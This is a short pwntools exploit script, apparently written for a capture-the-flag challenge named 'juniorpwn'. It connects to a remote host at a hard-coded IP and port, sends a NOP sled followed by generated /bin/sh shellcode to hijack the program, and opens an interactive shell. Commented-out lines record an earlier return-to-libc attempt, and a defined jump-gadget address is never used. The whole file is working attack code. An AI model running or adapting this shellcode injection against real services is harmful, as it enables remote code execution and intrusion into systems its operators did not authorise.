from pwn import *

elf = context.binary = ELF("./juniorpwn", checksec=False)
context.log_level='debug'
p=remote("52.59.124.14", 10034)

# puts_got = 0x404000
# puts_plt = 0x0000000000401030
# ret_address = 0x000000000040101a
# main_func = 0x0000000000401156
jmp_rax = 0x00000000004010ce
# system = 0x00000000004c3a0
# binsh = 0x196031
shellcode=asm(shellcraft.popad())
shellcode+=asm(shellcraft.sh())

# payload = b"a"*520
payload = b"\x90"*600
payload += shellcode
# payload += p64(puts_got)
# payload += p64(main_func)

p.recv()
p.sendline(payload)
p.interactive()
